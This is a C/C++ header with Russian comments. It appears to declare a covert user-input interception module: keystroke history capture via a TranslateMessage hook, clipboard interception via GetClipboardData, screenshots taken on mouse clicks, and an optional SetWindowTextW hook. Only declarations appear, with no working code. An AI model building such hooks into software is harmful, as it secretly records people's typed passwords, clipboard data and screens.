/*
  Перехват ввода пользователя.
*/
#pragma once

namespace UserHook
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Включение захвата изображения при клики.

    IN clickCount - кол. кликов для захвата.
    IN filePrefix - префикс имен файлов изоброжений. Может быть NULL.
  */
  void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
  
  /*
    Очистка буфера ввода пользователя.
  */
  void clearInput(void);

  /*
    Получение текущей истории ввода.

    OUT buffer - буфер, необходимо освободить через Mem.

    Return     - 0 - если буфер пусть, *buffer будет равен NULL.
                 >0 - размер buffer в символах, исключая нулевой символ.
  */
  DWORD getInput(LPWSTR *buffer);
  
  /*
    Перехватчик TranslateMessage.
  */
  BOOL WINAPI hookerTranslateMessage(const MSG *msg);

  /*
    Перехватчик GetClipboardData.
  */
  HANDLE WINAPI hookerGetClipboardData(UINT format);

  /*
    Перехватчик SetWindowTextW.
  */
#if defined HOOKER_SETWINDOWTEXT
  BOOL WINAPI hookerSetWindowTextW(HWND window, const LPWSTR string);
#endif
};
